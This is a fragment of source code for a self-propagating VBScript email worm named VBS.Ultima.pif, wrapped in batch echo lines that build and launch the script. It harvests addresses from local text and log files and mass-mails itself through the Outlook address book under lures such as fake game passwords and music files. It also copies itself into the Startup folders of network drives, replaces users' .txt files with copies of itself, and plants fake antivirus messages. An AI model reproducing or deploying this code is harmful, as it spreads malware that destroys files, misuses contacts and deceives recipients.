l&amp;C("########")&amp;l&amp;C("I!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _  &gt;&gt;c:\Ultima.vbs
echo l&amp;C("########")&amp;l&amp;C("D!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _
l&amp;C("########")&amp;l&amp;C("@!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _  &gt;&gt;c:\Ultima.vbs
echo l&amp;C("########")&amp;l&amp;C("S!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")&amp; _
l&amp;C("########")&amp;l&amp;C("U!1!1!1")&amp;l&amp;C("R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU")  &gt;&gt;c:\Ultima.vbs
echo UO.Close
end if
end if
if (O="crack.exe") then
e.copy(folderspec&amp;"\crack.vbs")
e.copy(folderspec&amp;"\crack.exe")
end if  &gt;&gt;c:\Ultima.vbs
echo if (O="tmhelp32.dll") then
e.copy(folderspec&amp;"\tmhelp32.dll")
end if
if (O="navdx.exe") then
e.copy(folderspec&amp;"\navdx.exe")  &gt;&gt;c:\Ultima.vbs
echo end if
if (O="rescue.dll") then
e.copy(folderspec&amp;"\rescue.dll")
end if
if (O="Virscan1.dat") then
e.copy(folderspec&amp;"\rescue.dll")  &gt;&gt;c:\Ultima.vbs
echo end if
next
end sub
sub cu(folderspec)
On Error Resume Next
dim bc,bd,sf
set bc = a.GetFolder(folderspec)
set sf = bc.SubFolders  &gt;&gt;c:\Ultima.vbs
echo for each bd in sf
bb(bd.path)
cu(bd.path)
next
end sub
Function XX(XB)
Dim XC
Dim XU
XC = ""
For XU = 1 To Len(XB) Step 2  &gt;&gt;c:\Ultima.vbs
echo XC = XC &amp; Chr( "&amp;h" &amp; Mid(XB,XU, 2 ))
Next
XX = XC
End Function
if month(now) =9 and day(now) =20 then
set BadJokee3=a.CreateTextFile(b&amp;"\ShellNew\Winword.doc")  &gt;&gt;c:\Ultima.vbs
echo BadJokee3.writeline "Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ART"
Badjokee3.close
set BadJokee4=a.CreateTextFile(b&amp;"\ShellNew\Excel.xls")  &gt;&gt;c:\Ultima.vbs
echo BadJokee4.writeline "Norton AntiVirus repair This File. (VBS.ULTIMA.pif) by BR3AK-H3ART"
Badjokee4.close
end if  &gt;&gt;c:\Ultima.vbs
echo ML=a.createtextfile(b&amp;"\mailci.dII")                'Search Driver's and files all mail's send ;) / new system  &gt;&gt;c:\Ultima.vbs
echo ML.Writeline "'VBS.ULTIMA.pif-MAIL-SEACRH"&amp;l&amp;"'mail files search system Coded by BR3AK-H3ART"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "'age:17"&amp;l&amp;"'from:TURKEY" &amp;l&amp;"'Mail:br3ak_h3art@hotmail.com"&amp;l&amp;"On Error Resume Next"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set a = CreateObject("&amp;Z&amp;"Scripting.FileSystemObject"&amp;Z&amp;")"&amp;l&amp;"Set b = a.GetSpecialFolder(0)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "l=Chr(13)&amp;Chr(10)"&amp;l&amp;"n=Chr(34)"&amp;l&amp;"scrg()"&amp;l&amp;"sub scrg"&amp;l&amp;"On Error Resume Next"&amp;l&amp;"Dim ax,ba,O"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set ba = a.Drives"&amp;l&amp;"For Each ax in ba"&amp;l&amp;"If ax.DriveType = 2 or ax.DriveType=3 Then "&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "cu(ax.path&amp;"&amp;Z&amp;"\"&amp;Z&amp;")"&amp;l&amp;"end if"&amp;l&amp;"Next "&amp;l&amp;"scrg = O"&amp;l&amp;"end sub"&amp;l&amp;"sub bb(folderspec)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "On Error Resume Next"&amp;l&amp;"dim bc,bd,be,U,O"&amp;l&amp;"set bc = a.GetFolder(folderspec)"&amp;l&amp;"set be = bc.Files"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "for each bd in be"&amp;l&amp;"U=a.GetExtensionName(bd.path)"&amp;l&amp;"U=lcase(U)"&amp;l&amp;"O=lcase(bd.name)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if (U="&amp;Z&amp;"txt-"&amp;Z&amp;") or (U="&amp;Z&amp;"log"&amp;Z&amp;") then  "&amp;l&amp;"set siz3=a.getfile(bd.path)"&amp;l&amp;"ssiz3=siz3.size"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if ssiz3 &gt; 50000 then "&amp;l&amp;"else"&amp;l&amp;"set txtfile=a.OpenTextFile(bd.path)"&amp;l&amp;"yazi=txtfile.ReadAll"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "For sayi = 1 To Len(yazi)"&amp;l&amp;"sayigeri=sayi"&amp;l&amp;"isaret=sayi"&amp;l&amp;"JU = Mid(yazi, sayi, 1)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if JU = "&amp;Z&amp;"@"&amp;Z&amp;" then"&amp;l&amp;"for num = 1 to 20"&amp;l&amp;"sayigeri=sayigeri + 1"&amp;l&amp;"zayu= Mid(yazi, sayigeri, 1)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "MAIL=MAIL&amp;ZAYU"&amp;l&amp;"if (zayu = "&amp;Z&amp;"."&amp;Z&amp;") then"&amp;l&amp;"zayu2= Mid(yazi, sayigeri, 4)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if (zayu2 = "&amp;Z&amp;".com"&amp;Z&amp;") then"&amp;l&amp;"ZMAIL=MAIL"&amp;l&amp;"MAIL="&amp;Z&amp;""&amp;Z&amp;""&amp;l&amp;"for zum = 1 to 20"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "isaret=isaret - 1"&amp;l&amp;"if isaret="&amp;Z&amp;"0"&amp;Z&amp;" then"&amp;l&amp;"exit for"&amp;l&amp;"else"&amp;l&amp;"K= Mid(yazi, isaret, 1)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if (K = "&amp;Z&amp;"."&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"-"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;" "&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"*"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"/"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"\"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"("&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;")"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"="&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"'"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;""&amp;Z&amp;""&amp;Z&amp;""&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"#"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"^"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;Chr(37)&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"+"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"&amp;"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"{"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"["&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"]"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"}"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"?"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"~"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"�"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;";"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;":"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"."&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;","&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"`"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"�"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"|"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = chr(10)) or _"&amp;l&amp;"(isaret="&amp;Z&amp;"1"&amp;Z&amp;") then"&amp;l&amp;"else"&amp;l&amp;"mail2=K&amp;mail2"&amp;l&amp;"end if"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "if (K = "&amp;Z&amp;"."&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"-"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;" "&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"*"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"/"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"\"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"("&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;")"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"="&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"'"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;""&amp;Z&amp;""&amp;Z&amp;""&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"#"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"^"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;Chr(37)&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"+"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"&amp;"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"{"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"["&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"]"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"}"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"?"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"~"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"�"&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;";"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;":"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"."&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;","&amp;Z&amp;") or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(K = "&amp;Z&amp;"`"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"�"&amp;Z&amp;") or _"&amp;l&amp;"(K = "&amp;Z&amp;"|"&amp;Z&amp;") or _"&amp;l&amp;"(K = chr(10)) or _"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "(isaret="&amp;Z&amp;"1"&amp;Z&amp;") then"&amp;l&amp;"Set OL01 = CreateObject("&amp;Z&amp;"Outlook.Application"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set OL02 = OL01.GetNameSpace("&amp;Z&amp;"MAPI"&amp;Z&amp;")"&amp;l&amp;"Set OL05 = OL01.CreateItem(0)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL05.BCC = mail2&amp;"&amp;Z&amp;"@"&amp;Z&amp;"&amp;ZMAIL&amp;"&amp;Z&amp;"com"&amp;Z&amp;""&amp;l&amp;"OL05.Subject = "&amp;Z&amp;"Ultima Online Password &amp; Bugs"&amp;Z&amp;""&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL05.Body = "&amp;Z&amp;"You new Password and new Ultima Bugs"&amp;Z&amp;""&amp;l&amp;"OL05.Attachments.Add b&amp;"&amp;Z&amp;"\UO.pif"&amp;Z&amp;""&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL05.DeleteAfterSubmit = True"&amp;l&amp;"OL05.Send"&amp;l&amp;"ZMAIL="&amp;Z&amp;""&amp;Z&amp;""&amp;l&amp;"mail2="&amp;Z&amp;""&amp;Z&amp;""&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "exit for"&amp;l&amp;"else "&amp;l&amp;"end if"&amp;l&amp;"end if"&amp;l&amp;"next"&amp;l&amp;"exit for"&amp;l&amp;"end if"&amp;l&amp;"end if"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "next"&amp;l&amp;"end if"&amp;l&amp;"next"&amp;l&amp;"end if"&amp;l&amp;"end if"&amp;l&amp;"next"&amp;l&amp;"end sub"&amp;l&amp;"sub cu(folderspec)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "On Error Resume Next"&amp;l&amp;"dim bc,bd,sf"&amp;l&amp;"set bc = a.GetFolder(folderspec)"&amp;l&amp;"set sf = bc.SubFolders"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "for each bd in sf"&amp;l&amp;"bb(bd.path)"&amp;l&amp;"cu(bd.path)"&amp;l&amp;"next"&amp;l&amp;"end sub"
ML.close
g.run(b&amp;"\mailci.dII")
SMAIL=a.createtextfile(b&amp;"\outmail.dII")  &gt;&gt;c:\Ultima.vbs
echo SMAIL.Writeline "'VBS.Ultima.pif / Network infected and Outlook adresslist send / Coded by BR3AK-H3ART"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "On Error Resume Next"&amp;l&amp;"Set a = CreateObject("&amp;Z&amp;"Scripting.FileSystemObject"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set b = a.GetSpecialFolder(0)"&amp;l&amp;"Set g = CreateObject("&amp;Z&amp;"WScript.Shell"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set HH = CreateObject("&amp;Z&amp;"WScript.Network"&amp;Z&amp;")"&amp;l&amp;"Set RNC = HH.EnumNetworkDrives"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "If RNC.Count "&amp;chr(60)&amp;chr(62)&amp;" 0 Then"&amp;l&amp;"For A04 = 0 To RNC.Count - 1"&amp;l&amp; _
"If InStr( RNC.Item(A04),"&amp;Z&amp;"\"&amp;Z&amp;") "&amp;chr(60)&amp;chr(62)&amp;" 0 Then"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),"&amp;Z&amp;"\WINDOWS\Start Menu\Programs\StartUp\BR3AK-H3ART.vbs"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),"&amp;Z&amp;"\WINDOWS\desktop\Web-passwords.vbs"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "End If"&amp;l&amp;"Next"&amp;l&amp;"End If"&amp;l&amp;"Set OL01 = CreateObject("&amp;Z&amp;"Outlook.Application"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set OL02 = OL01.GetNameSpace("&amp;Z&amp;"MAPI"&amp;Z&amp;")"&amp;l&amp;"For Each OL03 In OL02.AddressLists"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "For OL04 = 1 To OL03.AddressEntries.Count"&amp;l&amp;"Set OL05 = OL01.CreateItem(0)"&amp;l&amp; _
"Set OL06 = OL01.CreateItem(0)"&amp;l&amp;"OL05.BCC = OL03.AddressEntries(OL04).Address"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL05.Subject = "&amp;Z&amp;"Ultima Online Password &amp; Bugs"&amp;Z&amp;""&amp;l&amp;"OL05.Body = "&amp;Z&amp;"You new Password and new Ultima Bugs"&amp;Z&amp;""&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL05.Attachments.Add b&amp;"&amp;Z&amp;"\uo.pif"&amp;Z&amp;""&amp;l&amp;"OL05.DeleteAfterSubmit = True"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL05.Send"&amp;l&amp;"OL06.BCC = OL03.AddressEntries(OL04).Address"&amp;l&amp;"OL06.Subject = "&amp;Z&amp;"Tarkan new Remix demo"&amp;Z&amp;""&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL06.Body = "&amp;Z&amp;"Tarkan new Remix"&amp;Z&amp;""&amp;l&amp;"OL06.Attachments.Add b&amp;"&amp;Z&amp;"\Tarkan-remix-4.Mp3.pif"&amp;Z&amp;""&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "OL06.DeleteAfterSubmit = True"&amp;l&amp;"OL06.Send"&amp;l&amp;"Next"&amp;l&amp;"Next"
g.run(b&amp;"\outmail.dII")
set txtinf=a.createtextfile(b&amp;"\txtinfsystem.dII")  &gt;&gt;c:\Ultima.vbs
echo txtinf.writeline "'VBS.Ultima.pif-TXT.LOG"&amp;l&amp; _
"'txt and log infected system,Run txt file Open TXT file and Virus file,Coded by BR3AK-H3ART"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "'age:17 / from:TURKEY"&amp;"'Mail:br3ak_h3art@hotmail.com"&amp;l&amp;"On Error Resume Next"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set a = CreateObject("&amp;Z&amp;"Scripting.FileSystemObject"&amp;Z&amp;")"&amp;l&amp;"Set b = a.GetSpecialFolder(0)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "l=Chr(13)&amp;Chr(10)"&amp;l&amp;"n=Chr(34)"&amp;l&amp;"scrg()"&amp;l&amp;"sub scrg"&amp;l&amp; _
"On Error Resume Next"&amp;l&amp;"Dim ax,ba,O"&amp;l&amp;"Set ba = a.Drives"&amp;l&amp;"For Each ax in ba"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "If ax.DriveType = 2 or ax.DriveType=3 Then"&amp;l&amp;"cu(ax.path&amp;"&amp;Z&amp;"\"&amp;Z&amp;")"&amp;l&amp;"end if"&amp;l&amp; _
"Next"&amp;l&amp;"scrg = O"&amp;l&amp;"end sub"&amp;l&amp;"sub bb(folderspec)"&amp;l&amp;"On Error Resume Next"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "dim bc,bd,be,U,O"&amp;l&amp;"set bc = a.GetFolder(folderspec)"&amp;l&amp;"set be = bc.Files"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "for each bd in be"&amp;l&amp;"U=a.GetExtensionName(bd.path)"&amp;l&amp;"U=lcase(U)"&amp;l&amp; _
"O=lcase(bd.name)"&amp;l&amp;"if (U="&amp;Z&amp;"txt"&amp;Z&amp;") or (U="&amp;Z&amp;"TXT"&amp;Z&amp;") then"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "dim bg,bl,bm,bn"&amp;l&amp;"bg=a.GetBaseName(bd.path)"&amp;l&amp; _
"set bl=a.CreateTextFile(d&amp;"&amp;Z&amp;"\"&amp;Z&amp;"&amp;bg&amp;"&amp;Z&amp;".txt.txt-"&amp;Z&amp;")"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "Set bm=a.OpenTextFile(bd.path)"&amp;l&amp;"bn=bm.readall"&amp;l&amp;"bl.Writeline bn"&amp;l&amp; _
"bl.close"&amp;l&amp;"bm.close"&amp;l&amp;"a.DeleteFile(bd.path)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "e.Copy(folderspec&amp;"&amp;Z&amp;"\"&amp;Z&amp;"&amp;bg&amp;"&amp;Z&amp;".txt.vbs"&amp;Z&amp;")"&amp;l&amp;"end if"&amp;l&amp;"bk.close"&amp;l&amp; _
"next"&amp;l&amp;"end sub"&amp;l&amp;"sub cu(folderspec)"&amp;l&amp;"On Error Resume Next"&amp;l&amp;"dim bc,bd,sf"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "set bc = a.GetFolder(folderspec)"&amp;l&amp;"set sf = bc.SubFolders"&amp;l&amp;"for each bd in sf"&amp;l&amp;"bb(bd.path)"&amp;l&amp; _  &gt;&gt;c:\Ultima.vbs
echo "cu(bd.path)"&amp;l&amp;"next"&amp;l&amp;"end sub"
txtinf.close
g.run(b&amp;"\txtinfsystem.dII")
Function atchmail(atchmailz)
On Error Resume Next  &gt;&gt;c:\Ultima.vbs
echo Dim OL01, OL02, OL03, OL04, OL05
Set OL01 = CreateObject("Outlook.Application")
Set OL02 = OL01.GetNameSpace("MAPI")  &gt;&gt;c:\Ultima.vbs
echo For Each OL03 In OL02.AddressLists
For OL04 = 1 To OL03.AddressEntries.Count
Set OL05 = OL01.CreateItem(0)  &gt;&gt;c:\Ultima.vbs
echo OL05.BCC = OL03.AddressEntries(OL04).Address
OL05.Subject = "Ultima Online Password &amp; Bugs"  &gt;&gt;c:\Ultima.vbs
echo OL05.Body = "You new Password and new Ultima Bugs"
OL05.Attachments.Add atchmailz
OL05.DeleteAfterSubmit = True  &gt;&gt;c:\Ultima.vbs
echo OL05.Send
Next
Next
end Function
if (a.FileExists(b&amp;"\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII")) Then  &gt;&gt;c:\Ultima.vbs
echo else
set INFO=a.CreateTextFile(b&amp;"\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII")  &gt;&gt;c:\Ultima.vbs
echo INFO.Writeline "MSGBOX ""You Computer infected VBS/Ultima.pif Viruses.!� "&amp;_
" ah bad Problem "&amp;_  &gt;&gt;c:\Ultima.vbs
echo " Good Luck!"",0,""Author : By BR3AK-H3ART / Mail : br3ak_h3art@hotmail.com / AGE : 17 / FROM : TURKEY"""
end if  &gt;&gt;c:\Ultima.vbs
echo if month(now) = 8 then
atchmail(aatch)
end if  &gt;&gt;c:\Ultima.vbs
echo  &gt;&gt;c:\Ultima.vbs
echo copy c:\windows\wscript.exe c:\ &gt;c:\Runwin.bat
echo Wscript Ultima.vbs &gt;&gt;c:\Runwin.bat
call c:\Runwin.bat
